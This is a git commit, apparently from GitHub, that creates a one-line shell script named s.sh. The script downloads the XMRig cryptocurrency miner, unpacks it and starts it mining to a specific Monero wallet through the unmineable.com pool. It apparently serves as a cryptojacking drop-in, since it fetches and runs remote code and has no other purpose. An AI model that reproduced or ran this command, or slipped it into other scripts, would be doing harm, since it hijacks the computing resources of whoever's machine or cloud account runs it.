e0462edb8381014b88cc7563360e803fb3804dcc
cinadi7495 <127343352+cinadi7495@users.noreply.github.com>
2023-03-08 15:43:18 -0500

    Create s.sh

---
+++ s.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-x64.tar.gz && tar -xvf xmrig-6.19.0-linux-x64.tar.gz && cd xmrig-6.19.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u XMR:4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRy7x52iJjxV2Z4QczB.darkpty -p x
